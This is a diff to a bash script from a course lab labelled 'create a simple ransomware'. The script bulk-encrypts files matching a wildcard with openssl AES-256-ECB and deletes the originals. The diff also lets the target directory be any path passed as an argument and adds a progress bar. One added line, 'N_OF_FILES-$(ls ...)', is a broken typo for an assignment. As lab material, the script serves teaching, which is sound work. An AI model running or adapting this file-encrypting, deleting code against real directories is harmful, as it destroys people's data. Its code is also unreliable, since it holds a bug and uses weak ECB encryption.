@@ -5,7 +5,7 @@
 # Lab no. 5
 # "create a simple ransomware"
 
-FILEDIR=/tmp/lab5_files/
+FILEDIR=$1
 
 # create the directory, if it does not already exist
 mkdir -p $FILEDIR
@@ -21,7 +21,8 @@ then
 	echo -e "enter password: "
 	read pass
 	#openssl aes-256-ecb -in $input -out $input.dec  -d -k $pass
-	for FILE in $(ls $FILEDIR$input)  
+	N_OF_FILES=$(ls $FILEDIR/$input| wc -l)
+	for FILE in $(ls $FILEDIR/$input)  
 	do
 		openssl aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.dec -d -k $pass 
 		rm $FILE
@@ -30,31 +31,48 @@ then
 
 elif [[ $choice -eq 1 ]]
 then 
-	echo " **encryption mode**"
-	echo -e "enter the input filename(or filenames, with ls wildcards): "
+	echo " **Encryption mode**"
+	echo -e "Enter the input filename(or filenames, with ls wildcards): "
 	read input
-	echo -e "enter password: "
+	echo -e "Enter password: "
 	read pass
 	#openssl enc -aes-256-ecb -in $input -out $input.enc  -k $pass
-	for FILE in $(ls $FILEDIR$input)
+	N_OF_FILES-$(ls $FILEDIR/$input| wc -l)
+	for FILE in $(ls $FILEDIR/$input)
         do
                 openssl enc -aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.enc -k $pass 
 		rm $FILE
         done
 elif [[ $choice -eq 0  ]]
 then
-	echo " Enter how many files you want to create"
+	echo "How many files to create:"
 	read number_of_files
-	echo "Enter a filename"
+	echo "Basic Filename(that supports wildcards, like ls):"
 	read filename
+	COUNT=1
+	echo -n "0%|---------------------|100%"
+	printf '\r'
 	for number in $(seq 1 $number_of_files)
 	do
 		# here we print a random string in the files specified
-		tr -dc A-Za-z0-9 </dev/urandom | head -c 13 > $FILEDIR$filename$number
-		echo "$FILEDIR$filename$number"
+		tr -dc A-Za-z0-9 </dev/urandom | head -c 13 > $FILEDIR/$filename$number
+
+		# and then calculate the percentage that is created:
+		PERC=$(( COUNT*100 ))  # we must first make COUNT bigger, bcoz shell cant handle floats!!
+		PERC=$(( PERC/number_of_files ))
+
+		# and use the percentage to print a loading bar:
+		echo -n "$PERC%|"
+		for i in $(seq 1 5 $PERC)  # step is 5 to reduce length of loading bar
+		do
+			echo -n "O"
+		done
+		printf '\r'  # return the cursor to the beginning of output line
+		COUNT=$(( COUNT+1 ))
 	done
+	# flush the output:
+	echo ""  #go to the next line
+	printf '\e[A\e[K'  # erase previous output line
 else
-	echo "Wrong Option"
+	echo "Wrong Option."
 fi
-
-
